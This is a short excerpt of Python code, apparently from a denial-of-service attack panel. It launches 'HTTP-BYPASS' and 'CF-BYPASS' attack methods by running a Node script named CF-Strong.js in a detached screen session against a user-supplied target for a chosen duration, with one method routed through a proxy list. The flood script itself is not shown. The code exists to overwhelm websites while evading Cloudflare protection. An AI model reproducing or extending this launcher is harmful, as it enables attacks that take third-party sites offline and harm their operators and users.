...
def execute_command():
    ...
    if method.upper() == 'HTTP-BYPASS':
        command = f"screen -dm timeout {duration} node CF-Strong.js {target} {duration} 37 13 proxies.txt"
    elif method.upper() == 'CF-BYPASS':
        command = f"screen -dm timeout {duration} node CF-Strong.js {target} {duration} 32 17"
